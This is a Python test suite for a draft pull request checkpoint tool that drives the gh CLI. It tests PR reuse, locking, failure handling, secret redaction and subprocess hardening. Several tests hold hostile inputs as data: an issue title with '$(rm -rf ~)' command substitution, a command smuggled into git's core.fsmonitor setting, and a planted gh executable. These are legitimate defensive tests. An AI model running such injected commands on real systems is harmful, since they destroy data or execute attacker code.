        def human_edit(_number: int) -> None:
            self.fake.prs[0]["body"] = "Opened by hand, then edited."

        self.fake.on_pull = human_edit
        outcome = self.check()
        self.assertOutcome(outcome, "reused", "body-changed")
        self.assertIn("next run", outcome.remedy)
        self.assertEqual(self.fake.gh_calls("edit"), [])
        self.assertEqual(self.fake.prs[0]["body"], "Opened by hand, then edited.")
        self.assertEqual(self.recorded()[-1]["reason"], "body-changed")

    def test_edit_rereads_the_pr_right_before_writing(self) -> None:
        self.fake.prs.append(pull(9, body="Opened by hand."))
        self.assertOutcome(self.check(), "reused")
        stages = [self.fake.stage(argv) for argv in self.fake.gh_calls()]
        self.assertEqual(stages[-2:], ["pull", "edit"])

    def test_failed_reread_is_retryable_and_writes_nothing(self) -> None:
        self.fake.prs.append(pull(9, body="Opened by hand."))
        self.fake.failures["pull"] = http(502)
        self.assertOutcome(self.check(), "failed-retryable", "github-error")
        self.assertEqual(self.fake.gh_calls("edit"), [])

    def test_hand_opened_pr_already_referencing_the_issue_is_untouched(self) -> None:
        for body in (
            "Part of #17.",
            "See https://github.com/o/r/issues/17 for context.",
        ):
            with self.subTest(body=body):
                self.fake.prs[:] = [pull(9, body=body)]
                self.assertOutcome(self.check(), "reused")
                self.assertNoWrite()
        self.fake.prs[:] = [pull(9, body="Unrelated #170 and o/r#1717.")]
        self.check()
        self.assertEqual(len(self.fake.gh_calls("edit")), 1)

    def test_ready_pr_is_never_turned_back_into_a_draft(self) -> None:
        self.fake.prs.append(pull(7, draft=False, body=section(run="older")))
        self.assertOutcome(self.check(), "reused")
        for argv in self.fake.gh_calls():
            for token in FORBIDDEN_EDIT_ARGS:
                self.assertNotIn(token, argv)

    def test_several_or_unbalanced_sections_are_left_alone(self) -> None:
        for body in (
            section() + "\n" + section(run="x"),
            BEGIN + "\nno end",
            END + "\n" + BEGIN,
        ):
            with self.subTest(body=body[:40]):
                self.fake.prs[:] = [pull(7, body=body)]
                outcome = self.check()
                self.assertOutcome(outcome, "reused", "section-unmanaged")
                self.assertEqual(
                    outcome.remedy, "keep one Ballast section in the PR body"
                )
                self.assertNoWrite()

    def test_hand_opened_pr_is_adopted_before_the_diff_check(self) -> None:
        self.fake.files = []
        self.fake.prs.append(pull(9, body="#17"))
        self.assertOutcome(self.check(), "reused")
        self.assertEqual(self.fake.gh_calls("compare"), [])
        self.assertEqual(self.fake.gh_calls("template"), [])

    def test_open_pr_against_another_base_blocks(self) -> None:
        self.fake.prs.append(pull(7, base="release"))
        outcome = self.check()
        self.assertOutcome(outcome, "blocked-ambiguous", "base-mismatch")
        self.assertIn(
            "PR #7 targets release, expected main", draft_pr.format_line(outcome)
        )
        self.assertNoWrite()
        self.assertEqual(
            self.recorded()[-1],
            {
                "outcome": "blocked-ambiguous",
                "reason": "base-mismatch",
                "issue": 17,
                "pr_number": 7,
                "pr_url": url(7),
                "matches": 1,
            },
        )


class ConcurrencyTests(CheckpointCase):
    """AC-009, FR-009, BL-INV-005."""

    def test_two_concurrent_checkpoints_create_one_pr(self) -> None:
        outcomes: list[draft_pr.Outcome] = []
        errors: list[BaseException] = []

        def work() -> None:
            try:
                outcomes.append(self.check())
            except BaseException as error:  # noqa: BLE001
                errors.append(error)

        threads = [threading.Thread(target=work) for _ in range(2)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join(timeout=60)
        self.assertEqual(errors, [])
        self.assertEqual(len(self.fake.gh_calls("create")), 1)
        self.assertEqual(sorted(item.state for item in outcomes), ["created", "reused"])

    def test_pr_created_by_another_clone_is_reused(self) -> None:
        def other_clone(_argv: list[str], _stdin: str | None) -> draft_pr.Result:
            self.fake.prs.append(pull(50, body=section(run="clone2")))
            return ALREADY_EXISTS

        self.fake.on_create = other_clone
        outcome = self.check()
        self.assertOutcome(outcome, "reused")
        self.assertEqual(outcome.pr_number, 50)
        self.assertEqual(self.fake.body_of("edit"), section())

    def test_created_pr_that_does_not_match_the_request_is_unverified(self) -> None:
        for created in (pull(42, draft=False), pull(42, base="release")):
            with self.subTest(created=created):
                self.fake.prs.clear()

                def wrong(
                    _argv: list[str], _stdin: str | None, pr: dict[str, Any] = created
                ) -> draft_pr.Result:
                    self.fake.prs.append(pr)
                    return draft_pr.Result(0, url(42))

                self.fake.on_create = wrong
                outcome = self.check()
                self.assertOutcome(outcome, "blocked-ambiguous", "create-unverified")
                self.assertEqual(outcome.pr_url, url(42))

    def test_lock_held_elsewhere_is_busy(self) -> None:
        path = ledger.common_dir(self.repo.root) / "ballast-pr.lock"
        with path.open("a+b") as handle, patch.object(draft_pr, "LOCK_WAIT", 0.2):
            fcntl.flock(handle, fcntl.LOCK_EX)
            self.assertOutcome(self.check(), "failed-retryable", "lock-busy")
        self.assertNoWrite()

    def test_symlinked_lock_is_refused(self) -> None:
        path = ledger.common_dir(self.repo.root) / "ballast-pr.lock"
        path.symlink_to(self.base / "elsewhere")
        outcome = self.check()
        self.assertOutcome(outcome, "failed-retryable", "internal-error")
        self.assertEqual(outcome.detail, "LockUnavailableError")
        self.assertFalse((self.base / "elsewhere").exists())
        self.assertNoWrite()


class RetryableFailureTests(CheckpointCase):
    """AC-010: every gh stage maps each failure to one fixed cause."""

    FAILURES = (
        (UNAUTHENTICATED, "gh-unauthenticated"),
        (http(401), "gh-unauthenticated"),
        (http(403), "gh-forbidden"),
        (TIMED_OUT, "github-unreachable"),
        (http(502), "github-error"),
    )

    def prepare(self, stage: str) -> None:
        self.fake.prs.clear()
        self.fake.failures.clear()
        if stage == "edit":
            self.fake.prs.append(pull(7, body=section(run="older")))

    def test_each_stage_and_failure_is_retryable_with_its_remedy(self) -> None:
        stages = ("repo", "issue", "comments", "pulls", "compare", "template")
        for stage in (*stages, "create", "edit"):
            for result, reason in self.FAILURES:
                with self.subTest(stage=stage, reason=reason):
                    self.prepare(stage)
                    self.fake.failures[stage] = result
                    outcome = self.check()
                    self.assertOutcome(outcome, "failed-retryable", reason)
                    self.assertEqual(
                        outcome.remedy,
                        draft_pr.REMEDIES["failed-retryable", reason].format(
                            repo="o/r"
                        ),
                    )
                    if reason == "gh-unauthenticated":
                        self.assertEqual(outcome.remedy, "run gh auth login")
                    self.fake.failures.clear()
                    self.assertIn(self.check().state, {"created", "reused"})


class BlockedOutcomeTests(CheckpointCase):
    """AC-011, AC-012: ambiguity and closed PRs change nothing on GitHub."""

    def test_two_open_prs_are_ambiguous(self) -> None:
        self.fake.prs += [pull(7), pull(8)]
        outcome = self.check()
        self.assertOutcome(outcome, "blocked-ambiguous", "several-open")
        self.assertEqual(
            draft_pr.format_line(outcome),
            f"Draft PR: blocked-ambiguous (several-open) {url(7)} {url(8)}: "
            "close all but one of the listed PRs",
        )
        self.assertEqual(self.recorded()[-1]["matches"], 2)
        self.assertNoWrite()

    def test_closed_or_merged_pr_blocks(self) -> None:
        cases = (
            ([pull(7, state="closed", closed_at="2026-10-01T00:00:00Z")], "closed", 7),
            (
                [pull(7, state="closed", merged=True, closed_at="2026-10-01")],
                "merged",
                7,
            ),
            (
                [
                    pull(7, state="closed", merged=True, closed_at="2026-10-01"),
                    pull(8, state="closed", closed_at="2026-10-02"),
                ],
                "merged",
                8,
            ),
        )
        for prs, reason, latest in cases:
            with self.subTest(reason=reason, latest=latest):
                self.fake.prs[:] = prs
                outcome = self.check()
                self.assertOutcome(outcome, "blocked-closed", reason)
                self.assertEqual(
                    (outcome.pr_number, outcome.pr_url), (latest, url(latest))
                )
                for pr in prs:
                    self.assertIn(pr["html_url"], draft_pr.format_line(outcome))
                self.assertNoWrite()

    def test_closed_pr_on_a_later_page_is_found(self) -> None:
        self.fake.pr_pages = [
            [pull(n, head="other") for n in range(100, 200)],
            [pull(7, state="closed", closed_at="2026-10-01")],
        ]
        self.assertOutcome(self.check(), "blocked-closed", "closed")
        self.assertNoWrite()


class LeakageTests(CheckpointCase):
    """AC-014, FR-013 and hostile input."""

    def test_no_credential_reaches_output_or_ledger(self) -> None:
        noisy = " ".join(SECRETS)
        self.fake.repo["secret"] = noisy
        scenarios = [
            {},
            {"prs": [pull(7, body=section(run="x"))]},
            {"prs": [pull(7), pull(8)]},
            {"prs": [pull(7, state="closed")]},
            {"files": []},
        ]
        scenarios += [
            {"fail": (stage, draft_pr.Result(1, "", f"{noisy} (HTTP 502)"))}
            for stage in ("repo", "issue", "comments", "pulls", "compare", "template")
        ]
        scenarios.append({"fail": ("create", draft_pr.Result(4, noisy, noisy))})
        output = io.StringIO()
        for scenario in scenarios:
            self.fake.prs[:] = scenario.get("prs", [])
            self.fake.files = scenario.get("files", [{"filename": "src/x.py"}])
            self.fake.failures.clear()
            if "fail" in scenario:
                stage, result = scenario["fail"]
                self.fake.failures[stage] = result
            with redirect_stdout(output), redirect_stderr(output):
                sys.stdout.write(draft_pr.format_line(self.check()) + "\n")
        stored = ledger.ledger_path(self.repo.root, RUN).read_text()
        for secret in (*SECRETS, "ghp_", "gho_", "Authorization"):
            self.assertNotIn(secret, output.getvalue())
            self.assertNotIn(secret, stored)

    def test_hostile_issue_title_is_one_verbatim_argument(self) -> None:
        title = "$(rm -rf ~) `id` --draft=false"
        self.fake.issue = {"number": 17, "title": title}
        self.check()
        create = self.fake.gh_calls("create")[0]
        self.assertEqual(create[create.index("--title") + 1], title)

    def test_internal_error_prints_only_the_exception_type(self) -> None:
        with patch.object(draft_pr, "_scope", side_effect=RuntimeError(SECRETS[0])):
            outcome = self.check()
        self.assertOutcome(outcome, "failed-retryable", "internal-error")
        line = draft_pr.format_line(outcome)
        self.assertTrue(line.startswith("Draft PR: failed-retryable (internal-error)"))
        self.assertIn("RuntimeError", line)
        self.assertNotIn(SECRETS[0], line)
        self.assertEqual(self.recorded()[-1]["reason"], "internal-error")


class CommandSeamTests(unittest.TestCase):
    """The real seam: list argv, no shell, the operator's tokens, gh settings."""

    def setUp(self) -> None:
        # Test directories live under /tmp; the temp-root rule has its own tests.
        patcher = patch.object(ledger, "agent_temp_roots", tuple)
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_command_passes_tokens_and_gh_settings_without_shell(self) -> None:
        tokens = {name: "secret-" + name for name in draft_pr.TOKEN_VARIABLES}
        captured: dict[str, Any] = {}

        def fake_run(
            argv: list[str], **kwargs: object
        ) -> subprocess.CompletedProcess[str]:
            captured.update(kwargs, argv=argv)
            return subprocess.CompletedProcess(argv, 0, "out", "")

        with (
            patch.dict(os.environ, tokens),
            patch.object(draft_pr.subprocess, "run", fake_run),
        ):
            result = draft_pr._command(["/usr/bin/gh", "api", "x"], cwd=Path("/"))  # noqa: SLF001
        self.assertEqual(result, draft_pr.Result(0, "out", ""))
        self.assertEqual(captured["argv"], ["/usr/bin/gh", "api", "x"])
        self.assertNotIn("shell", captured)
        self.assertEqual(captured["timeout"], draft_pr.TIMEOUT)
        for name, value in {**tokens, **draft_pr.GH_ENV}.items():
            self.assertEqual(captured["env"][name], value)

    def test_child_path_keeps_only_entries_outside_working_trees(self) -> None:
        # DEC-0004: gh runs git itself; a checkout-local git must not be on its PATH.
        captured: dict[str, Any] = {}

        def fake_run(
            argv: list[str], **kwargs: object
        ) -> subprocess.CompletedProcess[str]:
            captured.update(kwargs)
            return subprocess.CompletedProcess(argv, 0, "", "")

        with TemporaryDirectory() as temp:
            base = Path(temp).resolve()
            checkout = base / "repo"
            (checkout / ".git").mkdir(parents=True)
            (checkout / "bin").mkdir()
            (base / "system").mkdir()
            path = os.pathsep.join(
                [str(checkout / "bin"), "relative", "", str(base / "system")]
            )
            away = base / "away"
            away.mkdir()
            with (
                patch.dict(
                    os.environ,
                    {
                        "PATH": path,
                        "GIT_DIR": str(checkout / ".git"),
                        "GIT_WORK_TREE": "/",
                    },
                ),
                patch.object(draft_pr.subprocess, "run", fake_run),
            ):
                draft_pr._command(["/usr/bin/gh"], cwd=away, root=checkout)  # noqa: SLF001
        env = captured["env"]
        self.assertEqual(env["PATH"], str(base / "system"))
        self.assertNotIn("GIT_DIR", env)
        self.assertNotIn("GIT_WORK_TREE", env)
        self.assertEqual(captured["cwd"], away)
        self.assertEqual(env["GIT_CEILING_DIRECTORIES"], str(base))
        overrides = {
            env[f"GIT_CONFIG_KEY_{i}"]: env[f"GIT_CONFIG_VALUE_{i}"]
            for i in range(int(env["GIT_CONFIG_COUNT"]))
        }
        self.assertEqual(overrides["core.fsmonitor"], "false")
        self.assertEqual(overrides["core.hooksPath"], os.devnull)

    def test_path_entries_in_agent_writable_temp_roots_are_dropped(self) -> None:
        # R2 round 2: Codex's workspace-write sandbox can write /tmp and
        # $TMPDIR, so a gh or git planted there must never be trusted.
        with TemporaryDirectory() as temp:
            base = Path(temp).resolve()
            planted = base / "planted"
            executable(planted / "gh", "#!/bin/sh\nexit 0\n")
            (base / "repo").mkdir()
            with (
                patch.object(ledger, "agent_temp_roots", lambda: (base,)),
                patch.object(draft_pr, "_path_entries", lambda: [str(planted)]),
            ):
                found, shadowed = draft_pr._resolve("gh", base / "repo")  # noqa: SLF001
                kept = draft_pr._child_path(base / "repo")  # noqa: SLF001
            self.assertIsNone(found)
            self.assertTrue(shadowed)
            self.assertNotIn(str(planted), kept.split(os.pathsep))

    def test_default_temp_roots_cover_tmp_and_tmpdir(self) -> None:
        roots = REAL_TEMP_ROOTS()
        for path in ("/tmp", "/var/tmp", "/dev/shm"):  # noqa: S108
            self.assertIn(Path(path).resolve(), roots)
        with patch.dict(os.environ, {"TMPDIR": "/srv/agent-tmp"}):
            self.assertIn(Path("/srv/agent-tmp").resolve(), REAL_TEMP_ROOTS())

    def test_gh_never_reads_the_checkouts_git_config(self) -> None:
        # Security review of DEC-0004: gh runs git itself, and .git/config is
        # agent-writable; a core.fsmonitor command there must never run.
        with TemporaryDirectory() as temp:
            base = Path(temp).resolve()
            repo = TempRepo(base / "repo")
            sentinel = base / "fsmonitor-ran"
            (repo.root / "tracked").write_text("x\n")
            git(repo.root, "add", "tracked")
            touch = shutil.which("touch")
            git(repo.root, "config", "core.fsmonitor", f"{touch} {sentinel}; false")
            system = base / "system"
            (system / "git").parent.mkdir()
            (system / "git").symlink_to(REAL_GIT)
            gh = executable(
                system / "gh",
                f"#!/bin/sh\npwd > {base / 'gh-cwd'}\ngit status >/dev/null 2>&1\n",
            )
            work = draft_pr._Checkpoint(repo.root, RUN)  # noqa: SLF001
            work.run.gh = str(gh)
            with patch.dict(os.environ, {"PATH": str(system)}):
                work.gh("pr", "list")
            ran_in = Path((base / "gh-cwd").read_text().strip()).resolve()
            self.assertFalse(ran_in.is_relative_to(repo.root), ran_in)
            self.assertFalse(sentinel.exists())

    def test_timeout_is_reported_not_raised(self) -> None:
        def slow(argv: list[str], **_: object) -> None:
            raise subprocess.TimeoutExpired(argv, draft_pr.TIMEOUT)

        with patch.object(draft_pr.subprocess, "run", slow):
            result = draft_pr._command(["/usr/bin/gh"], cwd=Path("/"))  # noqa: SLF001
        self.assertTrue(result.timed_out)


if __name__ == "__main__":
    unittest.main()
